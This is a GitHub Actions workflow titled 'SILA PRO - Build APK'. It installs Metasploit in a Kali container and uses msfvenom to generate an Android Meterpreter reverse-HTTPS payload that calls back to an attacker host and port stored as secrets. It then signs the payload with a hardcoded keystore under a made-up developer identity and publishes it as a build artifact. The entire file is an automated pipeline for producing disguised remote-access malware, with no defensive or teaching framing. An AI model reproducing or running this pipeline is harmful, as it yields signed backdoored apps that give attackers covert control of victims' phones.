name: SILA PRO - Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: kalilinux/kali-rolling:latest

    steps:
    - name: Checkout
      uses: actions/checkout@v4

    - name: Install Required Tools
      run: |
        apt-get update -y
        apt-get install -y metasploit-framework apktool default-jdk apksigner

    - name: Generate and Sign APK
      env:
        LHOST: ${{ secrets.LHOST }}
        LPORT: ${{ secrets.LPORT }}
      run: |
        mkdir -p output
        # Generate payload
        msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -o output/sila_raw.apk
        # Create keystore
        keytool -genkey -v -keystore output/sila.keystore -alias sila -keyalg RSA -keysize 2048 -validity 10000 -storepass sila123 -keypass sila123 -dname "CN=SILA, OU=Dev, O=Silatech, L=DSM, C=TZ"
        # Sign APK
        apksigner sign --ks output/sila.keystore --ks-pass pass:sila123 --out output/sila_final.apk output/sila_raw.apk

    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: sila_pro_apk
        path: output/sila_final.apk
        retention-days: 90
